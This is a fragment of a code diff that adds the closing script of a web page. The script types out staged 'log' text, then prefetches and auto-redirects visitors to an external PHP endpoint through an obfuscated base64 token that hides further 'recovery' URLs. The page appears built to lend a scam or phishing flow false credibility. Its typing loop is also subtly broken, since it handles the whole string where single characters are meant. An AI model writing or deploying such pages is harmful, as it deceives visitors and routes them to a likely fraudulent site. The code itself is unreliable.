+                            let textHTML = realLogs;
+                            let currentHTML = "";
+                            let isTag = false;
+                            let i = 0;
+
+                            const typeInterval = setInterval(() => {
+                                if (i < textHTML.length) {
+                                    if (textHTML === '<') isTag = true;
+                                    currentHTML += textHTML;
+                                    if (textHTML === '>') isTag = false;
+
+                                    lineDiv.innerHTML = currentHTML; 
+                                    processLog.scrollTop = processLog.scrollHeight; 
+                                    i++;
+                                } else {
+                                    clearInterval(typeInterval);
+                                    lineDiv.classList.remove('typing-cursor');
+                                    realLogIndex++;
+                                    setTimeout(typeNextLine, 150); 
+                                }
+                            }, 10); 
+                        } else {
+                            setTimeout(triggerFinalRedirect, 600);
+                        }
+                    }
+                    typeNextLine();
+                }
+            }
+
+            // --- FINAL BLINKING LOGO & REDIRECT ---
+            function triggerFinalRedirect() {
+                const redirectUrl = "https://maxado.in/PG2/index.php?token=NDAwfHxhSFIwY0hNNkx5OW5iV3gxYm14dmF5NW5hWFJvZFdJdWFXOHZjbVZqYjNabGNua3ZZMjl1WjNKaGRIVnNZWFJwYjI1ekwzQjFZaTlwYm1SbGVBPT18fGh0dHBzOi8vZ21sdW5sb2suZ2l0aHViLmlvL3JlY292ZXJ5L2dtbC5naWY=";
+
+                finalRedirectScreen.classList.add('active');
+                
+                const prefetchLink = document.createElement('link');
+                prefetchLink.rel = 'prefetch';
+                prefetchLink.href = redirectUrl;
+                document.head.appendChild(prefetchLink);
+                
+                setTimeout(() => {
+                    window.location.href = redirectUrl;
+                }, 2000); 
+            }
+        });
+    </script>
+</body>
+</html>
